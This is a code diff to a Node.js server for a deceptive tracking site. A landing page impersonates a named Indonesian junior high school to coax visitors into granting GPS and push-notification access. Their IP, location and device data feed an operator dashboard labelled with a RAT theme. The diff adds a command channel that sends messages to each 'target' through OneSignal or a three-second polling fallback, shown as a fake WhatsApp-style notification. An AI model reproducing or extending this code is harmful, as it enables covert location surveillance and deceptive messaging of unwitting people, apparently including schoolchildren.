@@ -15,11 +15,13 @@ const GEO_FILE = path.join(TLOG, 'geo.tsv');
 const GPS_FILE = path.join(TLOG, 'gps.tsv');
 const DEVICE_FILE = path.join(TLOG, 'devices.json');
 const OS_IDS_FILE = path.join(TLOG, 'onesignal_ids.json');
+const CMD_FILE = path.join(TLOG, 'commands.json');
 
 if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
 if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
 if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
 if (!fs.existsSync(OS_IDS_FILE)) fs.writeFileSync(OS_IDS_FILE, '{}');
+if (!fs.existsSync(CMD_FILE)) fs.writeFileSync(CMD_FILE, '[]');
 
 function clientIp(req) {
   const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
@@ -47,9 +49,7 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-// ==============================================================
-// API ENDPOINTS
-// ==============================================================
+// --- API ONESIGNAL ---
 app.post('/api/save-player', (req, res) => {
   const ip = clientIp(req);
   const { playerId } = req.body;
@@ -64,20 +64,44 @@ app.post('/api/save-player', (req, res) => {
 app.post('/api/push', async (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
   const { ip, text } = req.body;
+  
   let ids = {};
   try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
   const playerId = ids[ip];
-  if (!playerId) return res.json({ ok: false, msg: 'Target belum izinin notif' });
+  
+  // --- LAPIS 1: ONE SIGNAL (Tembus HP) ---
+  if (playerId) {
+    try {
+      const response = await fetch('https://onesignal.com/api/v1/notifications', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
+        body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
+      });
+      const data = await response.json();
+      if (data.id) return res.json({ ok: true, method: 'push' });
+    } catch (e) { console.log("OneSignal Gagal:", e.message); }
+  }
 
-  try {
-    const response = await fetch('https://onesignal.com/api/v1/notifications', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
-      body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
-    });
-    const data = await response.json();
-    res.json({ ok: data.id ? true : false });
-  } catch (e) { res.json({ ok: false, msg: e.message }); }
+  // --- LAPIS 2: POLLING (Cadangan kalau web kebuka) ---
+  let cmds = [];
+  try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
+  cmds.push({ ip, cmd: 'notif', payload: text, time: Date.now(), status: 'pending' });
+  fs.writeFileSync(CMD_FILE, JSON.stringify(cmds));
+  
+  res.json({ ok: true, method: 'polling' });
+});
+
+app.get('/api/get-command', (req, res) => {
+  const ip = clientIp(req);
+  let cmds = [];
+  try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
+  const pending = cmds.find(c => c.ip === ip && c.status === 'pending');
+  if (pending) {
+    pending.status = 'executed';
+    fs.writeFileSync(CMD_FILE, JSON.stringify(cmds));
+    return res.json({ hasCmd: true, cmd: pending.cmd, payload: pending.payload });
+  }
+  res.json({ hasCmd: false });
 });
 
 app.get('/api/geoip', async (req, res) => {
@@ -99,7 +123,7 @@ app.post('/api/gps', (req, res) => {
 });
 
 // ==============================================================
-// DASHBOARD LIST
+// DASHBOARD
 // ==============================================================
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
@@ -169,9 +193,6 @@ app.get('/dash', (req, res) => {
   </body></html>`);
 });
 
-// ==============================================================
-// DASHBOARD MAP (TEMA SURXRAT)
-// ==============================================================
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -245,7 +266,7 @@ app.get('/dash/map', (req, res) => {
     const res = await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});
     const j = await res.json();
     document.getElementById('status').style.display='block';
-    document.getElementById('status').innerText = j.ok ? '✅ Notif Tembus Terkirim!' : '❌ Target Offline/Blm izinin';
+    document.getElementById('status').innerText = j.ok ? (j.method === 'push' ? '✅ Notif Tembus (OneSignal) Terkirim!' : '✅ Notif (Polling Web) Terkirim!') : '❌ Gagal kirim';
     setTimeout(()=>document.getElementById('status').style.display='none', 3000);
   }
   
@@ -260,7 +281,7 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// LANDING PAGE (INFORMASI SMPN 4 CIKUPA + 2 STEP IZIN)
+// LANDING PAGE (SMPN 4 CIKUPA + DUAL SYSTEM)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
@@ -324,6 +345,7 @@ app.get('*', (req, res) => {
     <h3>Akses Notifikasi</h3>
     <p>Dapatkan pengumuman penting dari sekolah langsung di HP Anda.</p>
     <button class="popup-btn" id="allowNotifBtn">Izinkan Notifikasi</button>
+    <button class="popup-btn" id="checkNotifBtn" style="margin-top:10px; background:#e2e8f0; color:#0f172a;">Cek Ulang</button>
   </div>
 </div>
 
@@ -338,7 +360,7 @@ app.get('*', (req, res) => {
   if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
   fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
-  // --- LANGKAH 1: LOKASI ---
+  // --- POPUP 1 ---
   setTimeout(() => { document.getElementById('popup1').classList.add('show'); }, 1000);
 
   document.getElementById('allowLocBtn').addEventListener('click', function() {
@@ -346,43 +368,61 @@ app.get('*', (req, res) => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
-        e => {},
-        {enableHighAccuracy:true,timeout:10000}
+        e => {}, {enableHighAccuracy:true,timeout:10000}
       );
     }
-    
     document.getElementById('popup1').classList.remove('show');
     setTimeout(() => { document.getElementById('popup2').classList.add('show'); }, 800);
   });
 
-  // --- LANGKAH 2: NOTIFIKASI (DENGAN ANTI-STUCK) ---
+  // --- POPUP 2 (NOTIFIKASI & DUAL SYSTEM) ---
+  async function requestNotif() {
+    if (!window.OneSignal) return false;
+    try {
+      await OneSignal.Notifications.requestPermission();
+      await new Promise(r => setTimeout(r, 1500)); 
+      const playerId = OneSignal.User.PushSubscription.id;
+      if(playerId) {
+        await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
+        return true;
+      }
+    } catch(e) { console.log(e); }
+    return false;
+  }
+
   document.getElementById('allowNotifBtn').addEventListener('click', async function() {
     this.innerText = 'Memproses...';
     this.disabled = true;
-    const btn = this;
-
-    // Timer Anti Stuck
-    const forceClose = setTimeout(() => {
-      document.getElementById('popup2').classList.remove('show');
-      btn.innerText = 'Izinkan Notifikasi';
-      btn.disabled = false;
-    }, 2500);
-
-    if (window.OneSignal) {
-      try {
-        await OneSignal.Notifications.requestPermission();
-        const playerId = OneSignal.User.PushSubscription.id;
-        if(playerId) {
-          await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
-        }
-      } catch(e) { console.log(e); }
-    }
-
-    clearTimeout(forceClose);
+    const success = await requestNotif();
+    
     document.getElementById('popup2').classList.remove('show');
-    btn.innerText = 'Izinkan Notifikasi';
-    btn.disabled = false;
+    this.innerText = 'Izinkan Notifikasi';
+    this.disabled = false;
   });
+
+  document.getElementById('checkNotifBtn').addEventListener('click', async function() {
+    this.innerText = 'Mengecek...';
+    const success = await requestNotif();
+    this.innerText = 'Cek Ulang';
+    if (success) document.getElementById('popup2').classList.remove('show');
+  });
+
+  // --- CADANGAN: POLLING 3 DETIK (KALAU ONE SIGNAL GAGAL) ---
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/get-command');
+      const j = await r.json();
+      if (j.hasCmd && j.cmd === 'notif') {
+        // Tampilkan notif manual kalau OneSignal nggak jalan
+        const notif = document.createElement('div');
+        notif.style.cssText = 'position:fixed;top:10px;left:10px;right:10px;background:#fff;padding:15px;border-radius:12px;box-shadow:0 5px 20px rgba(0,0,0,0.2);z-index:9999;display:flex;gap:10px;align-items:center;font-family:sans-serif;transform:translateY(-100%);transition:0.3s;';
+        notif.innerHTML = '<div style="width:35px;height:35px;background:#25D366;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;">💬</div><div style="flex:1;"><div style="font-weight:bold;font-size:13px;color:#000;">Pemberitahuan</div><div style="font-size:12px;color:#555;">' + j.payload + '</div></div>';
+        document.body.appendChild(notif);
+        setTimeout(()=> notif.style.transform = 'translateY(0)', 100);
+        setTimeout(() => { notif.style.transform = 'translateY(-100%)'; setTimeout(()=>notif.remove(), 400); }, 5000);
+      }
+    } catch(e){}
+  }, 3000);
 })();
 </script>
 </body></html>`);
